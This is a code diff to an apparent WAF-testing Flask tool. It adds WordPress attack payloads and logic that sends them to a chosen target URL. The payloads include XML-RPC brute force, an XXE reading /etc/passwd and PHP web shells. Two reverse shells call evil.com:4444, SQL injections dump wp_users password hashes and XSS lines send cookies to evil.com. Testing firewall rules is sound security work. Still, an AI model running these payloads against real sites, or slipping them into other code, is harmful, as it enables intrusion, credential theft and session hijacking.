@@ -245,6 +245,117 @@ AWS_WAF_PAYLOADS = {
     "AWS-RateLimit": [],
 }
 
+# WordPress-specific attack payloads (based on WPForce techniques)
+WP_PAYLOADS = {
+    "WP-XMLRPC": [
+        '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password123</string></value></param></params></methodCall>',
+        '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>pass1</string></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>pass2</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>',
+        '<?xml version="1.0"?><methodCall><methodName>wp.getOptions</methodName><params><param><value><string>1</string></value></param><param><value><string>admin</string></value></param><param><value><string>admin</string></value></param></params></methodCall>',
+        '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com/xxe</string></value></param><param><value><string>http://target.com/?p=1</string></value></param></params></methodCall>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>&xxe;</value></param><param><value>test</value></param></params></methodCall>',
+        '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>',
+    ],
+    "WP-LoginBrute": [
+        "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=admin&pwd=password123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=administrator&pwd=admin123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=admin&pwd=P%40ssw0rd&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=root&pwd=toor&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=admin&pwd=' OR '1'='1'--&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+    ],
+    "WP-Enumeration": [
+        "/wp-json/wp/v2/users",
+        "/wp-json/wp/v2/users/1",
+        "/wp-json/wp/v2/posts?per_page=100",
+        "/wp-json/wp/v2/pages?per_page=100",
+        "/wp-json/wp/v2/settings",
+        "/wp-json/wp/v2/plugins",
+        "/wp-json/wp/v2/themes",
+        "/?author=1",
+        "/?author=2",
+        "/?author=3",
+        "/wp-json/oembed/1.0/embed?url=http://target.com/",
+        "/wp-json/",
+        "/?rest_route=/wp/v2/users",
+        "/feed/",
+        "/wp-sitemap.xml",
+    ],
+    "WP-PathTraversal": [
+        "/wp-config.php",
+        "/wp-config.php.bak",
+        "/wp-config.php.save",
+        "/wp-config.php~",
+        "/wp-config.php.old",
+        "/wp-config.txt",
+        "/../../../wp-config.php",
+        "/wp-content/debug.log",
+        "/wp-content/uploads/",
+        "/wp-includes/version.php",
+        "/wp-admin/install.php",
+        "/wp-admin/setup-config.php",
+        "/.wp-config.php.swp",
+        "/wp-content/uploads/wpforms/.htaccess",
+        "/wp-content/backups/",
+        "/wp-content/backup-db/",
+        "/.htaccess",
+        "/.htpasswd",
+    ],
+    "WP-ShellUpload": [
+        '<?php system($_GET["cmd"]); ?>',
+        '<?php $f=new ReflectionFunction("system");$f->invoke($_GET["cmd"]); ?>',
+        "<?php echo shell_exec(base64_decode($_GET['cmd'])); ?>",
+        "<?php call_user_func_array('system', array($_GET['cmd'])); ?>",
+        "<?php eval(base64_decode($_POST['e'])); ?>",
+        '<?php $sock=fsockopen("evil.com",4444);exec("/bin/bash -i <&3 >&3 2>&3"); ?>',
+        "<?php passthru($_REQUEST['cmd']); ?>",
+        "<?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,'evil.com',4444);$p=proc_open('/bin/sh',array(0=>$s,1=>$s,2=>$s),$pipes); ?>",
+        'GIF89a<?php system($_GET["cmd"]); ?>',
+    ],
+    "WP-SQLi": [
+        "' UNION SELECT user_login,user_pass FROM wp_users--",
+        "' UNION SELECT user_login,user_email FROM wp_users WHERE ID=1--",
+        "1 OR 1=1 UNION SELECT group_concat(user_login,0x3a,user_pass) FROM wp_users--",
+        "' UNION SELECT option_value FROM wp_options WHERE option_name='admin_email'--",
+        "' UNION SELECT option_value FROM wp_options WHERE option_name='siteurl'--",
+        "1; SELECT * FROM wp_users--",
+        "' AND (SELECT COUNT(*) FROM wp_users) > 0--",
+        "' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
+    ],
+    "WP-XSS": [
+        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
+        '"><img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">',
+        "<script>new Image().src='http://evil.com/steal?c='+document.cookie;</script>",
+        '[caption width="1" caption=\'<a href="http://onmouseover=alert(1)//\'>XSS\']</a>',
+        "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
+        '<a href="javascript:alert(document.domain)">click</a>',
+        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+        '{{constructor.constructor("return this")().alert(1)}}',
+    ],
+    "WP-PluginExploit": [
+        "/wp-content/plugins/revslider/temp/update_extract/revslider/shell.php",
+        "/wp-content/plugins/gravityforms/change_log.txt",
+        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
+        "/wp-content/plugins/easy-wp-smtp/readme.txt",
+        "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
+        "/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php",
+        "/wp-content/plugins/wordfence/tmp/",
+        "/wp-admin/admin-post.php?swp_debug=load_options",
+        "/wp-content/plugins/wp-symposium/server/php/index.php",
+        "/wp-admin/admin-ajax.php?action=uploadFontIcon",
+    ],
+}
+
+WP_RULE_GROUP_MAP = {
+    "WP-XMLRPC": "WordPress XML-RPC Attack",
+    "WP-LoginBrute": "WordPress Login Brute Force",
+    "WP-Enumeration": "WordPress Enumeration",
+    "WP-PathTraversal": "WordPress Path Traversal",
+    "WP-ShellUpload": "WordPress Shell Upload",
+    "WP-SQLi": "WordPress SQL Injection",
+    "WP-XSS": "WordPress XSS",
+    "WP-PluginExploit": "WordPress Plugin Exploit",
+}
+
 # Mapping of AWS WAF rule groups for reporting
 AWS_RULE_GROUP_MAP = {
     "AWS-CRS-Size": "AWSManagedRulesCommonRuleSet (SizeRestrictions)",
@@ -269,9 +380,10 @@ AWS_RULE_GROUP_MAP = {
     "CRLF": "General CRLF",
     "SSI": "General SSI",
     "Mail Injection": "General Mail Injection",
+    **WP_RULE_GROUP_MAP,
 }
 
-ALL_PAYLOADS = {**ATTACK_PAYLOADS, **{k: v for k, v in AWS_WAF_PAYLOADS.items() if v}}
+ALL_PAYLOADS = {**ATTACK_PAYLOADS, **{k: v for k, v in AWS_WAF_PAYLOADS.items() if v}, **WP_PAYLOADS}
 
 
 def encode_payload(payload, encoding):
@@ -376,6 +488,7 @@ def index():
     return render_template("index.html",
                            categories=ATTACK_PAYLOADS,
                            aws_categories=AWS_WAF_PAYLOADS,
+                           wp_categories=WP_PAYLOADS,
                            rule_group_map=AWS_RULE_GROUP_MAP)
 
 
@@ -532,17 +645,37 @@ def run_batch_test():
             if cat == "AWS-RateLimit":
                 continue
             is_bot_ua = (cat == "AWS-BotControl-UA")
+            is_wp_path = (cat in ("WP-Enumeration", "WP-PathTraversal", "WP-PluginExploit"))
+            is_wp_xmlrpc = (cat == "WP-XMLRPC")
+            is_wp_login = (cat == "WP-LoginBrute")
             for payload in ALL_PAYLOADS.get(cat, []):
                 for enc in encodings:
                     index += 1
                     if is_bot_ua:
                         encoded_payload = payload
+                    elif is_wp_path or is_wp_xmlrpc or is_wp_login:
+                        encoded_payload = payload
                     else:
                         encoded_payload = encode_payload(payload, enc)
 
-                    url, headers, body = prepare_request(
-                        target_url, injection_point, encoded_payload,
-                        custom_headers, is_bot_ua=is_bot_ua)
+                    if is_wp_path:
+                        url = target_url.rstrip("/") + payload
+                        headers = dict(custom_headers)
+                        body = None
+                    elif is_wp_xmlrpc:
+                        url = target_url.rstrip("/") + "/xmlrpc.php"
+                        headers = dict(custom_headers)
+                        headers["Content-Type"] = "text/xml"
+                        body = payload
+                    elif is_wp_login:
+                        url = target_url.rstrip("/") + "/wp-login.php"
+                        headers = dict(custom_headers)
+                        headers["Content-Type"] = "application/x-www-form-urlencoded"
+                        body = payload
+                    else:
+                        url, headers, body = prepare_request(
+                            target_url, injection_point, encoded_payload,
+                            custom_headers, is_bot_ua=is_bot_ua)
 
                     resp = send_request(url, method, headers, body, timeout, follow_redirects)
                     result = {
@@ -550,7 +683,7 @@ def run_batch_test():
                         "index": index,
                         "category": cat,
                         "payload": payload[:200],
-                        "encoding": "UA" if is_bot_ua else enc,
+                        "encoding": "UA" if is_bot_ua else ("path" if is_wp_path else ("xml" if is_wp_xmlrpc else ("form" if is_wp_login else enc))),
                         "status": resp["status"],
                         "http_status": resp["http_status"],
                         "time": resp["time"],
